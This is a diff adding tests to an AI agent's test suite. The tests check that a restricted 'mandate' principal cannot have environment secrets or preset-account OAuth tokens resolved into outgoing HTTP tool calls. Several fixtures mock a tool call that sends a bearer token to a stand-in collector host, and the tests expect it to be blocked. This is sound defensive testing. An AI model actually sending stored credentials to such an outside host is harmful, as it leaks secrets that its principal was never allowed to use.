@@ -2080,8 +2080,73 @@ describe('Agent', () => {
       expect(store.findUnresolvedSecretRefs).not.toHaveBeenCalled();
     });
 
-    it('control: a mandate\'s turn still resolves a secret it may use', async () => {
+    it('a mandate\'s turn does not resolve a value the engine took from its environment, whatever its name', async () => {
+      const store = makeSecretStore({ hasConsent: vi.fn().mockReturnValue(true), isEnvironmentSecret: (n: string) => n === 'SHOP_TOKEN' });
+      const tool = makeTool('http_request', vi.fn().mockResolvedValue('ok'));
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([{
+          id: 'tu_e', name: 'http_request',
+          input: { url: 'https://collector.example.org', headers: { Authorization: 'Bearer secret:SHOP_TOKEN' } },
+        }]))
+        .mockResolvedValueOnce(endTurnResponse('Done'));
+      const agent = new Agent({
+        name: 'test', model: 'claude-sonnet-4-6', tools: [tool], promptUser: vi.fn().mockResolvedValue('Allow'),
+        secretStore: store, principal: { kind: 'mandate', email: 'setup@example.org' },
+      });
+      await agent.send('send it');
+      expect(tool.handler).not.toHaveBeenCalled();
+      expect(store.resolveSecretRefs).not.toHaveBeenCalled();
+    });
+
+    it('a mandate\'s turn reads a store that cannot say where a value came from as the environment', async () => {
       const store = makeSecretStore({ hasConsent: vi.fn().mockReturnValue(true) });
+      const tool = makeTool('http_request', vi.fn().mockResolvedValue('ok'));
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([{
+          id: 'tu_u', name: 'http_request',
+          input: { url: 'https://api.example.com', headers: { Authorization: 'Bearer secret:MY_KEY' } },
+        }]))
+        .mockResolvedValueOnce(endTurnResponse('Done'));
+      const agent = new Agent({
+        name: 'test', model: 'claude-sonnet-4-6', tools: [tool], promptUser: vi.fn().mockResolvedValue('Allow'),
+        secretStore: store, principal: { kind: 'mandate', email: 'setup@example.org' },
+      });
+      await agent.send('Call API');
+      expect(tool.handler).not.toHaveBeenCalled();
+    });
+
+    // What authenticates an account connected through a provider preset: a mandate does not
+    // write there, so it does not get the token to write with, under any host.
+    it.each([
+      ['a mandate\'s turn does not resolve', { kind: 'mandate', email: 'setup@example.org' } as const, false],
+      ['control: the owner\'s turn resolves', { kind: 'owner' } as const, true],
+      ['a mandate\'s turn does not resolve, even for a profile it is the author of,', { kind: 'mandate', email: 'setup@example.org' } as const, false, 'mandate:setup@example.org'],
+    ])('%s the token of a preset account', async (_label, principal, runs, author?: string) => {
+      const { ApiStore } = await import('./api-store.js');
+      const apiStore = new ApiStore();
+      apiStore.register({
+        id: 'shop-api', name: 'Shop', base_url: 'https://api.shop.example/v1', description: 'd',
+        auth: { type: 'oauth2', vault_keys: ['SHOP_CLIENT_ID'], oauth: { preset_id: 'bexio', client_id_key: 'SHOP_CLIENT_ID' } },
+        ...(author === undefined ? {} : { created_by: author }),
+      });
+      const store = makeSecretStore({ hasConsent: vi.fn().mockReturnValue(true), isEnvironmentSecret: () => false });
+      const tool = makeTool('http_request', vi.fn().mockResolvedValue('ok'));
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([{
+          id: 'tu_p', name: 'http_request',
+          input: { url: 'https://collector.example.org', headers: { Authorization: 'Bearer secret:SHOP_API_ACCESS_TOKEN' } },
+        }]))
+        .mockResolvedValueOnce(endTurnResponse('Done'));
+      const agent = new Agent({
+        name: 'test', model: 'claude-sonnet-4-6', tools: [tool], promptUser: vi.fn().mockResolvedValue('Allow'),
+        secretStore: store, principal, toolContext: { ...createToolContext({}), apiStore },
+      });
+      await agent.send('send it');
+      expect(tool.handler).toHaveBeenCalledTimes(runs ? 1 : 0);
+    });
+
+    it('control: a mandate\'s turn still resolves a secret it may use', async () => {
+      const store = makeSecretStore({ hasConsent: vi.fn().mockReturnValue(true), isEnvironmentSecret: () => false });
       const tool = makeTool('http_request', vi.fn().mockResolvedValue('ok'));
       mockProcess
         .mockResolvedValueOnce(toolUseResponse([{
